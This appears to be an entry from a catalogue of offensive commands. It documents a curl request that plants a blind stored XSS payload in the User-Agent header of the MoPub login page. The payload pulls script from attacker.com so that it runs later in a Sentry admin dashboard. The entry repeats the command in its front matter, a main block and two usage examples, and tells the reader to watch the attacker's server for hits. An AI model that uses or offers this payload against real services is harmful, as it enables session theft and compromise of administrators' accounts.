---
data: >-
  curl -X GET "https://demand.mopub.com/accounts/login/" -H "Host:
  demand.mopub.com" -H "Referer: 1" -H "User-Agent:
  '>"</title></style></textarea></script><script/src=attacker.com/js></script>"
  -H "X-Forwarded-For: 1" -H "X-OrigHost: demand.mopub.com" -H "Accept-Encoding:
  gzip,deflate" -H "Accept: */*"
tags:
  - xss
  - injection
type: command
output: null
executor: bash
platforms:
  - Linux
  - macOS
  - Windows
created_at: '2023-10-01T00:00:00Z'
updated_at: '2025-12-13T23:52:49.976Z'
id: 33d0c458-1d39-4e69-a3d1-b5b5762820fe
verified: false
validated: true
submitted: true
---
# inject-xss-user-agent-mopub

## Command

```bash
curl -X GET "https://demand.mopub.com/accounts/login/" \
  -H "Host: demand.mopub.com" \
  -H "Referer: 1" \
  -H "User-Agent: '>"</title></style></textarea></script><script/src=attacker.com/js></script>" \
  -H "X-Forwarded-For: 1" \
  -H "X-OrigHost: demand.mopub.com" \
  -H "Accept-Encoding: gzip,deflate" \
  -H "Accept: */*"
```

## Description

This command sends an HTTPS GET request to the MoPub login endpoint with a Blind Stored XSS payload in the User-Agent header to inject script that executes later in the Sentry admin dashboard.

## Parameters

| Parameter | Description | Required |
|-----------|-------------|----------|
| `-H "User-Agent: ..."` | XSS payload string to inject | Yes |
| `-H "Host: demand.mopub.com"` | Target host header | Yes |
| `-H "Referer: 1"` | Placeholder referer | No |
| `-H "X-Forwarded-For: 1"` | Placeholder for IP spoofing | No |
| `-H "X-OrigHost: demand.mopub.com"` | Original host | No |
| `-H "Accept-Encoding: gzip,deflate"` | Compression acceptance | No |
| `-H "Accept: */*"` | Accept all content types | No |

## Examples

### Basic Usage

```bash
curl -X GET "https://demand.mopub.com/accounts/login/" -H "User-Agent: '>"</title></style></textarea></script><script/src=attacker.com/js></script>" -H "Host: demand.mopub.com"
```

### Advanced Usage

Add verbose output with `-v` for debugging:

```bash
curl -v -X GET "https://demand.mopub.com/accounts/login/" -H "User-Agent: '>"</title></style></textarea></script><script/src=attacker.com/js></script>" -H "Host: demand.mopub.com" -H "Referer: https://example.com"
```

## Expected Output

HTTP response such as 200 OK or a redirect (e.g., 302 to login page), indicating the request was processed and payload stored. No immediate execution; check attacker's server for later hits.

## Related

- [[Related Procedure|procedures/Inject-Blind-XSS-Payload-via-User-Agent-Header]]
